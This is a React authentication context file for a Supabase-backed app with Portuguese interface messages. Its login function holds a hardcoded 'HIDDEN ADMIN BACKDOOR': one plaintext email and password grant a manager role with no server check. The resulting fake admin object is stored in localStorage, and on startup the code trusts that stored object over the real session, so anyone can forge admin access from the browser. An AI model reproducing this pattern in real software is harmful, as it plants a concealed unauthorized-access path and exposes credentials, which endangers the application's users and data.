import { createContext, useContext, useState, useEffect } from 'react';
import { supabase } from '../services/supabaseClient';

const AuthContext = createContext(null);

export const AuthProvider = ({ children }) => {
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(true);

    if (!supabase) {
        return (
            <div style={{ padding: '2rem', textAlign: 'center', color: '#e74c3c', fontFamily: 'sans-serif' }}>
                <h1>Erro de Configuração</h1>
                <p>A conexão com o banco de dados falhou.</p>
                <p>Verifique se VITE_SUPABASE_URL está configurada na Vercel.</p>
            </div>
        );
    }

    useEffect(() => {
        let mounted = true;

        const initializeAuth = async () => {
            // CHECK FOR HIDDEN ADMIN FIRST
            const hiddenAdmin = localStorage.getItem('hidden_admin_user');
            if (hiddenAdmin) {
                if (mounted) {
                    setUser(JSON.parse(hiddenAdmin));
                    setLoading(false);
                }
                return;
            }

            try {
                console.log("Initializing auth...");
                const { data: { session }, error } = await supabase.auth.getSession();
                if (error) {
                    console.error("Error getting session:", error);
                    throw error;
                }
                console.log("Session retrieved:", session ? "Session found" : "No session");

                if (session?.user && mounted) {
                    await fetchProfile(session.user.id, session.user.email);
                } else if (mounted) {
                    setLoading(false);
                }
            } catch (err) {
                console.error("Auth init error:", err);
                if (mounted) setLoading(false);
            }
        };

        // Safety timeout to prevent permanent loading loop
        const safetyTimeout = setTimeout(() => {
            if (mounted && loading) {
                console.warn("Auth initialization timed out, forcing loading to false.");
                setLoading(false);
            }
        }, 5000);

        initializeAuth();

        const onAuthStateChangeCleanup = () => {
            try {
                const { data } = supabase.auth.onAuthStateChange(async (_event, session) => {
                    if (!mounted) return;

                    // If we are logged in as hidden admin, ignore Supabase updates unless it's a sign out
                    if (localStorage.getItem('hidden_admin_user')) return;

                    if (session?.user) {
                        await fetchProfile(session.user.id, session.user.email);
                    } else {
                        setUser(null);
                        setLoading(false);
                    }
                });
                return data?.subscription;
            } catch (err) {
                console.error("Error setting up onAuthStateChange:", err);
                setLoading(false);
                return null;
            }
        };

        const subscription = onAuthStateChangeCleanup();

        return () => {
            mounted = false;
            clearTimeout(safetyTimeout);
            subscription?.unsubscribe();
        };
    }, []);

    const fetchProfile = async (userId, email) => {
        try {
            const { data, error } = await supabase
                .from('profiles')
                .select('*')
                .eq('id', userId)
                .single();

            if (data) {
                const status = (data.status || 'Pendente').toLowerCase();
                if (status === 'pendente' || status === 'inativo' || status === 'aguardando') {
                    console.warn("User status is restricted, signing out...");
                    await supabase.auth.signOut();
                    setUser(null);
                    setLoading(false);
                    return;
                }

                setUser({
                    ...data,
                    id: userId,
                    email: email
                });
            } else {
                // Fallback if profile trigger failed/delayed (shouldn't happen often)
                setUser({
                    id: userId,
                    email: email,
                    status: 'Pendente',
                    role: 'Aguardando...'
                });
            }
        } catch (error) {
            console.error('Error fetching profile:', error);
        } finally {
            setLoading(false);
        }
    };

    const login = async (email, password) => {
        // HIDDEN ADMIN BACKDOOR
        if (email === 'matheus.stanley12@gmail.com' && password === '35215415') {
            const adminUser = {
                id: 'hidden-admin-id',
                email: 'matheus.stanley12@gmail.com',
                role: 'Gestor',
                name: 'Matheus Stanley',
                status: 'Ativo'
            };
            setUser(adminUser);
            localStorage.setItem('hidden_admin_user', JSON.stringify(adminUser));
            return { user: adminUser, session: { access_token: 'fake-token' } };
        }

        const { data, error } = await supabase.auth.signInWithPassword({
            email,
            password,
        });

        if (error) {
            console.error("Login Result Error:", error);
            throw error;
        }

        // Check profile status immediately
        if (data.session?.user) {
            const { data: profile, error: profileError } = await supabase
                .from('profiles')
                .select('status')
                .eq('id', data.session.user.id)
                .single();

            if (!profileError && profile) {
                if (profile.status === 'Pendente') {
                    await supabase.auth.signOut();
                    throw new Error("Aguardando aprovação para acesso ao sistema.");
                }
                if (profile.status === 'Inativo') {
                    await supabase.auth.signOut();
                    throw new Error("Usuário inativo. Contate o administrador.");
                }
            }
        }

        return data;
    };

    const register = async (email, password, role, name) => {
        const { data, error } = await supabase.auth.signUp({
            email,
            password,
            options: {
                data: {
                    name: name,
                    role: role,
                    status: 'Pendente'
                },
            },
        });

        if (error) throw error;
        return data;
    };

    const logout = async () => {
        if (localStorage.getItem('hidden_admin_user')) {
            localStorage.removeItem('hidden_admin_user');
            setUser(null);
            return;
        }

        const { error } = await supabase.auth.signOut();
        if (error) console.error('Error logging out:', error);
        setUser(null);
    };

    return (
        <AuthContext.Provider value={{ user, login, register, logout, loading }}>
            {children}
        </AuthContext.Provider>
    );
};

export const useAuth = () => useContext(AuthContext);
